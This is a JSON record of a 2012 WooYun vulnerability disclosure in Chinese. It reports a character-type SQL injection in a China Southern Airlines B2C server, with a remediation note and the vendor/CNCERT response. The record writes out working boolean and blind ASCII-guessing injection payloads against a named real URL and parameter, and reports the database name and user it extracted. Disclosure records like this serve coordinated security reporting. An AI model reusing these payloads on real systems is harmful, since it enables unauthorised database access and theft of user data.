{"id": 14938, "wybug_id": "wooyun-2012-015941", "wybug_title": "中国南方航空某B2C服务器存在SQL注入可获取用户信息", "wybug_corp": "中国南方航空", "wybug_author": "rivers", "wybug_date": "2012-12-13 08:36", "wybug_open_date": "2013-01-27 08:37", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-01-27：\t细节向公众公开  简要描述： SQL注入导致攻击者可以获取该B2C服务器数据库中的数据库表、字段、数据信息。 详细说明：  利用http://ec.csair.com/B2C/data/minorenterprises/getQuestionByUserId.xsql?userId=-1中参数userId未过滤实施注入。   漏洞证明：  http://ec.csair.com/B2C/data/minorenterprises/getQuestionByUserId.xsql?userId=-1' or '1' = '2返回\n\nhttp://ec.csair.com/B2C/data/minorenterprises/getQuestionByUserId.xsql?userId=-1' or '1' = '1返回\n\n可知存在SQL注入，利用该注入点，由于不支持union，通过猜字符ascii码的方式对数据库进行猜解：http://ec.csair.com/B2C/data/minorenterprises/getQuestionByUserId.xsqluserId=-1' OR ascii(substr((select sys_context('userenv','db_name') from dual),1,1))>110 OR '1'='2 返回page内容为空的xml；http://ec.csair.com/B2C/data/minorenterprises/getQuestionByUserId.xsqluserId=-1' OR ascii(substr((select sys_context('userenv','db_name') from dual),1,1))=101 OR '1'='2 返回page内容为<QUESTION>我父亲的名字</QUESTION>的xml；以此类推，猜解到db_name的第一个字母为e，从而进一步猜解到数据库名称为:ecsdb、用户名称为:ECS、数据库表共461个、字段、内容：\n\n\n\n   修复方案：  建议检查应用程序代码，对用户输入、URL参数、POST参数和Cookie参数进行过滤。   版权声明：转载请注明来源 rivers@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2012-12-14 16:00 厂商回复： CNVD确认并复现所述情况（SQLMAP），并已转由CNCERT广东分中心协调涉事单位，同时结合14日出现的多起南航相关网站事件，拟在下周将这多起事件统一通报民航行业信息化主管部门。按完全影响机密性进行评分，基本危害评分7.79（高危），发现技术难度系数1.0，涉及行业或单位影响系数1.5，综合rank=11.685 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}